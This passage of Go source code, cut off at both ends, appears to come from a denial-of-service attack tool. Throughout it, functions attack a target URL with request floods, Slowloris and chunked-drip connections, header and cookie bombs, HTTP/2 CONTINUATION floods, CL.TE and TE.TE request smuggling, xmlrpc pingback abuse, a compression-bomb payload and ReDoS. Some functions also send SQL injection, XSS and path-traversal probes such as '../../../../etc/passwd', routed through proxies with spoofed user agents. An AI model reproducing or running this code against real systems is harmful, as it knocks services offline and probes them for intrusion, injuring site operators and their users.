            bioLen := 2000 + mrand.IntN(8000)
            return fmt.Sprintf(
                `{"user_id":"%d","action":"%s","bio":"%s","nonce":"%s","email":"%s","display_name":"%s"}`,
                mrand.IntN(9999999), apiActions[mrand.IntN(len(apiActions))],
                randString(bioLen), randString(32), randEmail(), randString(12+mrand.IntN(20)),
            )
        },
        func() string {
            var sb strings.Builder
            n := 500 + mrand.IntN(4500)
            sb.WriteString(`{"action":"bulk_insert","token":"`)
            sb.WriteString(randString(64))
            sb.WriteString(`","items":[`)
            for i := 0; i < n; i++ {
                if i > 0 {
                    sb.WriteByte(',')
                }
                fmt.Fprintf(&sb, `{"id":%d,"name":"%s","value":"%s"}`,
                    mrand.IntN(9999999), randString(8+mrand.IntN(16)), randString(20+mrand.IntN(100)))
            }
            sb.WriteString(`]}`)
            return sb.String()
        },
        func() string {
            depth := 20 + mrand.IntN(30)
            var sb strings.Builder
            for i := 0; i < depth; i++ {
                fmt.Fprintf(&sb, `{"level_%d":{"data":"%s","nested":`, i, randString(50+mrand.IntN(200)))
            }
            sb.WriteString(`{"end":true}`)
            for i := 0; i < depth; i++ {
                sb.WriteString(`}}`)
            }
            return sb.String()
        },
        func() string {
            return fmt.Sprintf(
                `{"query":"mutation { updateUser(input: $input) { id status } }","variables":{"input":{"id":"%d","name":"%s","bio":"%s","settings":{"theme":"%s","lang":"%s","notifications":%t,"data":"%s"}}}}`,
                mrand.IntN(9999999), randString(16), randString(3000+mrand.IntN(5000)),
                randString(8), randString(5), mrand.IntN(2) == 1, randString(1000+mrand.IntN(4000)),
            )
        },
        func() string {
            return fmt.Sprintf(
                `{"email":"%s","password":"%s","mfa_code":"%06d","device_id":"%s","fingerprint":"%s"}`,
                randEmail(), randString(16+mrand.IntN(32)), mrand.IntN(999999),
                randString(36), randString(64),
            )
        },
        func() string {
            var sb strings.Builder
            sb.WriteString(`{"action":"search","filters":{`)
            n := 20 + mrand.IntN(50)
            for i := 0; i < n; i++ {
                if i > 0 {
                    sb.WriteByte(',')
                }
                fmt.Fprintf(&sb, `"%s":"%s"`, randString(5+mrand.IntN(10)), randString(10+mrand.IntN(100)))
            }
            sb.WriteString(fmt.Sprintf(`},"page":%d,"limit":%d,"sort":"%s"}`,
                mrand.IntN(10000), 100+mrand.IntN(900), randString(8)))
            return sb.String()
        },
    }
    return generators[mrand.IntN(len(generators))]()
}

func httpAPIFlood(targetURL string, client *http.Client) error {
    body := genAPIPayload()
    fullURL := targetURL + apiEndpoints[mrand.IntN(len(apiEndpoints))]

    req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "application/json")
    req.Header.Set("X-Request-ID", randString(32))
    req.Header.Set("Authorization", "Bearer "+randString(64))
    req.Header.Set("Origin", targetURL)

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpSlowloris(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        rawConn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        conn = tlsConn
    }
    defer conn.Close()

    fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", host, randUA())

    ticker := time.NewTicker(1 + time.Duration(mrand.IntN(3))*time.Second)
    defer ticker.Stop()

    for {
        select {
        case <-stop:
            return nil
        case <-ticker.C:
            _, err := fmt.Fprintf(conn, "X-%s: %s\r\n", randString(5), randString(10))
            if err != nil {
                recordStatus("Err")
                totalErrors.Add(1)
                return err
            }
            recordStatus("Held")
            totalSuccess.Add(1)
        }
    }
}

func httpHeaderFlood(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())

    numHeaders := 50 + mrand.IntN(50)
    for i := 0; i < numHeaders; i++ {
        req.Header.Set("X-"+randString(8), randString(1024))
    }

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpMixPost(targetURL string, client *http.Client) error {
    var body string
    var contentType string
    switch mrand.IntN(4) {
    case 0:
        contentType = "application/json"
        body = fmt.Sprintf(`{"data":"%s","id":%d,"token":"%s"}`, randString(500), mrand.IntN(9999), randString(32))
    case 1:
        contentType = "application/xml"
        body = fmt.Sprintf(`<root><data>%s</data><id>%d</id></root>`, randString(500), mrand.IntN(9999))
    case 2:
        contentType = "application/x-www-form-urlencoded"
        body = "data=" + randString(500) + "&id=" + strconv.Itoa(mrand.IntN(9999))
    case 3:
        contentType = "text/plain"
        body = randString(500)
    }

    req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", contentType)
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpCFBypass(targetURL string, client *http.Client) error {
    sep := "?"
    if strings.Contains(targetURL, "?") {
        sep = "&"
    }
    fullURL := targetURL + sep + "q=" + randString(15) + "&p=" + strconv.Itoa(mrand.IntN(9999))

    req, err := http.NewRequest("GET", fullURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
    req.Header.Set("Accept-Language", "en-US,en;q=0.5")
    req.Header.Set("Accept-Encoding", "gzip, deflate, br")
    req.Header.Set("Connection", "keep-alive")
    req.Header.Set("Upgrade-Insecure-Requests", "1")
    req.Header.Set("Sec-Fetch-Dest", "document")
    req.Header.Set("Sec-Fetch-Mode", "navigate")
    req.Header.Set("Sec-Fetch-Site", "none")
    req.Header.Set("Sec-Fetch-User", "?1")
    req.Header.Set("Cache-Control", "max-age=0")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpRangeAttack(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())

    var ranges []string
    for i := 0; i < 100; i++ {
        ranges = append(ranges, fmt.Sprintf("0-%d", i*1000))
    }
    req.Header.Set("Range", "bytes="+strings.Join(ranges, ","))

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpCookieBomb(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())

    var cookies strings.Builder
    for i := 0; i < 500; i++ {
        cookies.WriteString("c")
        cookies.WriteString(strconv.Itoa(i))
        cookies.WriteString("=")
        cookies.WriteString(randString(100))
        cookies.WriteString("; ")
    }
    req.Header.Set("Cookie", cookies.String())

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

type chunkDripReader struct {
    stop <-chan struct{}
}

func (r *chunkDripReader) Read(p []byte) (int, error) {
    select {
    case <-r.stop:
        return 0, io.EOF
    case <-time.After(time.Duration(500+mrand.IntN(1500)) * time.Millisecond):
        n := copy(p, []byte(randString(10)))
        return n, nil
    }
}

func httpChunkPost(targetURL string, client *http.Client, stop <-chan struct{}) error {
    body := io.NopCloser(&chunkDripReader{stop: stop})
    req, err := http.NewRequest("POST", targetURL, body)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.ContentLength = -1
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

    cClient := *client
    cClient.Timeout = 0
    if t, ok := cClient.Transport.(*http.Transport); ok {
        tClone := t.Clone()
        tClone.ResponseHeaderTimeout = 0
        tClone.IdleConnTimeout = 0
        cClient.Transport = tClone
    }

    resp, err := cClient.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpMalformed(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        rawConn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        conn = tlsConn
    }

    longURL := "/" + randString(8192)
    payload := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n", longURL, host, randUA())
    _, err = conn.Write([]byte(payload))
    conn.Close()
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    recordStatus("Sent")
    totalSuccess.Add(1)
    return nil
}

func httpH2Continuation(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        rawConn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    tlsConn := tls.Client(rawConn, &tls.Config{
        ServerName:         host,
        NextProtos:         []string{"h2"},
        InsecureSkipVerify: true,
    })
    if err := tlsConn.Handshake(); err != nil {
        rawConn.Close()
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    defer tlsConn.Close()

    if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
        recordStatus("Err")
        totalErrors.Add(1)
        return fmt.Errorf("h2 not negotiated")
    }

    if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    bw := bufio.NewWriterSize(tlsConn, 65536)
    framer := http2.NewFramer(bw, tlsConn)
    framer.AllowIllegalWrites = true

    framer.WriteSettings(
        http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
        http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
    )
    bw.Flush()

    connDone := make(chan struct{})
    go func() {
        defer close(connDone)
        for {
            f, err := framer.ReadFrame()
            if err != nil {
                return
            }
            switch sf := f.(type) {
            case *http2.SettingsFrame:
                if !sf.IsAck() {
                    framer.WriteSettingsAck()
                    bw.Flush()
                }
            case *http2.GoAwayFrame:
                return
            }
        }
    }()

    var hdrBuf bytes.Buffer
    enc := hpack.NewEncoder(&hdrBuf)
    path := u.RequestURI()
    if path == "" {
        path = "/"
    }
    scheme := u.Scheme
    if scheme == "" || scheme == "http" {
        scheme = "https"
    }
    authority := u.Host

    var streamID uint32 = 1
    junkHeaders := make([]byte, 4000)
    for i := range junkHeaders {
        junkHeaders[i] = 'A'
    }

    for {
        select {
        case <-stop:
            return nil
        case <-connDone:
            recordStatus("Err")
            totalErrors.Add(1)
            return fmt.Errorf("connection closed by server")
        default:
        }

        hdrBuf.Reset()
        enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
        enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
        enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
        enc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})
        enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randUA()})

        if err := framer.WriteHeaders(http2.HeadersFrameParam{
            StreamID:      streamID,
            BlockFragment: hdrBuf.Bytes(),
            EndStream:     false,
            EndHeaders:    false,
        }); err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }

        for i := 0; i < 100; i++ {
            if err := framer.WriteContinuation(streamID, false, junkHeaders); err != nil {
                recordStatus("Err")
                totalErrors.Add(1)
                return err
            }
        }
        bw.Flush()

        recordStatus("Sent")
        totalSuccess.Add(1)
        streamID += 2

        if streamID >= 1<<31-1 {
            return nil
        }
    }
}

func httpGraphQLBatch(targetURL string, client *http.Client) error {
    fullURL := targetURL + "/api/graphql"
    var sb strings.Builder
    sb.WriteString("[")
    n := 100 + mrand.IntN(500)
    for i := 0; i < n; i++ {
        if i > 0 {
            sb.WriteByte(',')
        }
        sb.WriteString(fmt.Sprintf(`{"q%d":{"query":"query { user(id: %d) { name email posts { title } } }"}}`, i, mrand.IntN(9999)))
    }
    sb.WriteString("]")
    body := sb.String()

    req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "application/json")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpZstdBomb(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("POST", targetURL, bytes.NewReader(zstdBombPayload))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", "application/octet-stream")
    req.Header.Set("Content-Encoding", "gzip")
    req.Header.Set("Content-Length", strconv.Itoa(len(zstdBombPayload)))
    req.Header.Set("User-Agent", randUA())

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpReDoS(targetURL string, client *http.Client) error {
    redosPayload := strings.Repeat("a", 50) + "!"
    body := fmt.Sprintf(`{"email":"%s@example.com","username":"%s"}`, redosPayload, redosPayload)
    req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("User-Agent", randUA())

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpCachePoison(targetURL string, client *http.Client) error {
    sep := "/"
    if strings.HasSuffix(targetURL, "/") {
        sep = ""
    }
    fullURL := targetURL + sep + randString(10) + ".css"

    req, err := http.NewRequest("GET", fullURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "text/css,*/*;q=0.1")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpSmuggleCLTE(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        rawConn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        conn = tlsConn
    }
    defer conn.Close()

    smuggledPath := "/" + randString(15)
    payload := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\nUser-Agent: %s\r\n\r\n0\r\n\r\nGET %s HTTP/1.1\r\nHost: %s\r\n\r\n", host, randUA(), smuggledPath, host)
    _, err = conn.Write([]byte(payload))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    recordStatus("Sent")
    totalSuccess.Add(1)
    return nil
}

func httpPingback(targetURL string, client *http.Client) error {
    fullURL := targetURL + "/xmlrpc.php"
    body := `<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>` + targetURL + `/` + randString(10) + `</string></value></param><param><value><string>` + targetURL + `</string></value></param></params></methodCall>`

    req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", "text/xml")
    req.Header.Set("User-Agent", randUA())

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpOptionsFlood(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("OPTIONS", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")
    req.Header.Set("Access-Control-Request-Method", "GET")
    req.Header.Set("Access-Control-Request-Headers", "X-"+randString(10))
    req.Header.Set("Origin", "https://"+randString(10)+".com")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpDeleteFlood(targetURL string, client *http.Client) error {
    sep := "/"
    if strings.HasSuffix(targetURL, "/") {
        sep = ""
    }
    fullURL := targetURL + sep + randString(15)

    req, err := http.NewRequest("DELETE", fullURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "application/json")
    req.Header.Set("Authorization", "Bearer "+randString(64))

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpPutFlood(targetURL string, client *http.Client) error {
    body := fmt.Sprintf(`{"id":"%s","data":"%s","timestamp":%d}`, randString(36), randString(500+mrand.IntN(2000)), time.Now().Unix())
    sep := "/"
    if strings.HasSuffix(targetURL, "/") {
        sep = ""
    }
    fullURL := targetURL + sep + randString(15)

    req, err := http.NewRequest("PUT", fullURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "application/json")
    req.Header.Set("Authorization", "Bearer "+randString(64))

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpHeadFlood(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("HEAD", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpXSSProbe(targetURL string, client *http.Client) error {
    sep := "?"
    if strings.Contains(targetURL, "?") {
        sep = "&"
    }
    payload := randString(8) + "<script>alert(1)</script>"
    fullURL := targetURL + sep + "q=" + payload + "&p=" + payload

    req, err := http.NewRequest("GET", fullURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpSQLiProbe(targetURL string, client *http.Client) error {
    sep := "?"
    if strings.Contains(targetURL, "?") {
        sep = "&"
    }
    payloads := []string{"' OR '1'='1", "1; DROP TABLE users", "' UNION SELECT NULL, version()--"}
    fullURL := targetURL + sep + "id=" + url.QueryEscape(payloads[mrand.IntN(len(payloads))])

    req, err := http.NewRequest("GET", fullURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpPathTraversal(targetURL string, client *http.Client) error {
    payloads := []string{"../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"}
    sep := "/"
    if strings.HasSuffix(targetURL, "/") {
        sep = ""
    }
    fullURL := targetURL + sep + payloads[mrand.IntN(len(payloads))]

    req, err := http.NewRequest("GET", fullURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpSmuggleTete(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        rawConn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        conn = tlsConn
    }
    defer conn.Close()

    smuggledPath := "/" + randString(15)
    payload := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nContent-Length: 12\r\nUser-Agent: %s\r\n\r\n0\r\n\r\nGET %s HTTP/1.1\r\nHost: %s\r\n\r\n", host, randUA(), smuggledPath, host)
    _, err = conn.Write([]byte(payload))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    recordStatus("Sent")
    totalSuccess.Add(1)
    return nil
}

func httpEmptyFlood(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "/")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpInvalidReqLine(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        rawConn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        conn = tlsConn
    }
    defer conn.Close()

    payload := fmt.Sprintf("%s / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", randString(10), host, randUA())
    _, err = conn.Write([]byte(payload))
    if err != nil {
